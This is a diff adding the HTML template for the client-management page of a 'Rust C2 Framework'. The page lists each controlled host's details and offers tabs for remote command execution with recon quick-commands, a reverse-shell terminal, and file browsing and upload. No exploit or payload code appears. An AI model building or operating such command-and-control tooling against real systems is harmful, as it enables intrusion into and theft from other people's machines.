@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rust C2 Framework - 客户端管理</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body data-client-id="{{ client.id }}">
+    <div class="container">
+        <div class="header">
+            <div>
+                <h1>客户端管理</h1>
+                <div class="client-info">
+                    <div class="info-group">
+                        <span class="info-label">客户端ID:</span>
+                        <span><code>{{ client.id }}</code></span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">主机名:</span>
+                        <span><strong>{{ client.hostname }}</strong></span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">用户名:</span>
+                        <span>{{ client.username }}</span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">操作系统:</span>
+                        <span>{{ client.os }} ({{ client.arch }})</span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">IP地址:</span>
+                        <span>{{ client.ip }}</span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">连接时间:</span>
+                        <span>{{ client.connected_at.format("%Y-%m-%d %H:%M:%S") }}</span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">最后活动:</span>
+                        <span>{{ client.last_seen.format("%Y-%m-%d %H:%M:%S") }}</span>
+                    </div>
+                    <div class="info-group">
+                        <span class="info-label">状态:</span>
+                        <span id="client-status">
+                            {% if client.is_online %}
+                                <span class="status online">在线</span>
+                            {% else %}
+                                <span class="status offline">离线</span>
+                            {% endif %}
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="header-actions">
+                <a href="/" class="btn">返回主页</a>
+            </div>
+        </div>
+
+        <div class="tabs-container">
+            <div class="tabs">
+                <div class="tab-item active" data-tab="command">命令执行</div>
+                <div class="tab-item" data-tab="reverse-shell">反弹Shell</div>
+                <div class="tab-item" data-tab="file">文件管理</div>
+            </div>
+
+            <div class="tab-contents">
+                <!-- 命令执行标签页 -->
+                <div class="tab-content active" id="command-tab">
+                    <div class="command-section">
+                        <h3>快速命令</h3>
+                        <div class="quick-commands">
+                            <button class="btn btn-sm" onclick="setCommand('pwd')">当前目录</button>
+                            <button class="btn btn-sm" onclick="setCommand('ls -la')">列出文件</button>
+                            <button class="btn btn-sm" onclick="setCommand('whoami')">当前用户</button>
+                            <button class="btn btn-sm" onclick="setCommand('ps aux')">进程列表</button>
+                            <button class="btn btn-sm" onclick="setCommand('uname -a')">系统信息</button>
+                            <button class="btn btn-sm" onclick="setCommand('netstat -tlnp')">网络连接</button>
+                        </div>
+                        
+                        <h3>命令输入</h3>
+                        <div class="command-input-section">
+                            <input type="text" id="commandInput" placeholder="输入要执行的命令..." class="command-input">
+                            <button class="btn" onclick="executeCommand()">执行命令</button>
+                        </div>
+                        
+                        <div class="command-results">
+                            {% if !command_results.is_empty() %}
+                                <h3>命令执行结果</h3>
+                                {% for result in command_results %}
+                                    <div class="command-result">
+                                        <div class="result-header">
+                                            <strong>命令:</strong> {{ result.command }}
+                                            <span class="result-time">{{ result.executed_at.format("%H:%M:%S") }}</span>
+                                        </div>
+                                        <div class="result-output">
+                                            {% if !result.stdout.is_empty() %}
+                                                <pre>{{ result.stdout }}</pre>
+                                            {% endif %}
+                                            {% if !result.stderr.is_empty() %}
+                                                <div class="stderr">
+                                                    <pre>{{ result.stderr }}</pre>
+                                                </div>
+                                            {% endif %}
+                                            {% if result.exit_code != 0 %}
+                                                <div class="exit-code">
+                                                    <strong>退出码:</strong> {{ result.exit_code }}
+                                                </div>
+                                            {% endif %}
+                                        </div>
+                                    </div>
+                                {% endfor %}
+                            {% else %}
+                                <div class="no-results">
+                                    <h3>暂无命令执行记录</h3>
+                                    <p>执行命令后，结果将显示在这里</p>
+                                </div>
+                            {% endif %}
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 反弹Shell标签页 -->
+                <div class="tab-content" id="reverse-shell-tab">
+                    <div class="shell-section">
+                        <div class="shell-controls">
+                            <h3>反弹Shell控制</h3>
+                            <div class="shell-status">
+                                <div class="status-info">
+                                    <span class="status-label">状态:</span>
+                                    <span id="reverseShellStatus">未启动</span>
+                                </div>
+                                <div class="status-info">
+                                    <span class="status-label">会话ID:</span>
+                                    <span id="reverseShellSessionId">无</span>
+                                </div>
+                                <div id="connectionStatus" class="status-indicator">
+                                    <div id="connectionStatusDot" class="status-dot"></div>
+                                    <span id="connectionStatusText">未连接</span>
+                                </div>
+                            </div>
+                            <div class="shell-buttons">
+                                <button id="startShellBtn" class="btn btn-success" onclick="startReverseShell()">
+                                    启动反弹Shell
+                                </button>
+                                <button id="stopShellBtn" class="btn btn-danger" onclick="stopReverseShell()" style="display: none;">
+                                    关闭Shell连接
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="shell-terminal" id="shellTerminal">
+                            <div id="shellWelcome" class="shell-welcome">
+                                <h4>反弹Shell终端</h4>
+                                <p>点击"启动反弹Shell"开始会话</p>
+                            </div>
+                            <div id="shellOutput" class="shell-output"></div>
+                            <div id="shellInputLine" class="shell-input-line" style="display: none;">
+                                <span class="shell-prompt">$ </span>
+                                <div id="shellInput" class="shell-input" contenteditable="true"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 文件管理标签页 -->
+                <div class="tab-content" id="file-tab">
+                    <div class="file-section">
+                        <h3>文件管理</h3>
+                        
+                        <div class="file-navigation">
+                            <input type="text" id="currentPath" value="/" placeholder="输入路径..." class="path-input">
+                            <button class="btn" onclick="listDirectory()">浏览</button>
+                            <button class="btn btn-sm" onclick="goToParentDirectory()">返回上级</button>
+                        </div>
+
+                        <div class="file-upload-section">
+                            <h4>文件上传</h4>
+                            <div class="upload-controls">
+                                <input type="file" id="fileUpload" onchange="updateFileName(this)" class="file-input">
+                                <span id="fileNameDisplay" class="file-name-display">未选择任何文件</span>
+                                <button class="btn" onclick="uploadFile()">上传文件</button>
+                            </div>
+                        </div>
+
+                        <div class="file-list-section">
+                            <h4>文件列表</h4>
+                            <div id="loadingFiles" class="loading" style="display: none;">
+                                <p>正在加载文件列表...</p>
+                            </div>
+                            <div class="file-table-container">
+                                <table class="file-table">
+                                    <thead>
+                                        <tr>
+                                            <th>名称</th>
+                                            <th>类型</th>
+                                            <th>大小</th>
+                                            <th>权限</th>
+                                            <th>所有者</th>
+                                            <th>修改时间</th>
+                                            <th>操作</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="fileList">
+                                        <tr>
+                                            <td colspan="7" class="no-results">请点击"浏览"按钮加载文件列表</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Load modular JavaScript files -->
+    <script src="/static/js/common.js"></script>
+    <script src="/static/js/tabs.js"></script>
+    <script src="/static/js/command-execution.js"></script>
+    <script src="/static/js/reverse-shell.js"></script>
+    <script src="/static/js/file-manager.js"></script>
+    
+    <script>
+        // 动态更新客户端状态
+        function updateClientStatus() {
+            const lastSeen = new Date('{{ client.last_seen.format("%Y-%m-%dT%H:%M:%SZ") }}');
+            const now = new Date();
+            const diffInSeconds = (now - lastSeen) / 1000;
+            
+            const statusElement = document.getElementById('client-status');
+            if (diffInSeconds < 60) {
+                statusElement.innerHTML = '<span class="status online">在线</span>';
+            } else {
+                statusElement.innerHTML = '<span class="status offline">离线</span>';
+            }
+        }
+
+        // 页面加载时更新状态
+        updateClientStatus();
+    </script>
+</body>
+</html>
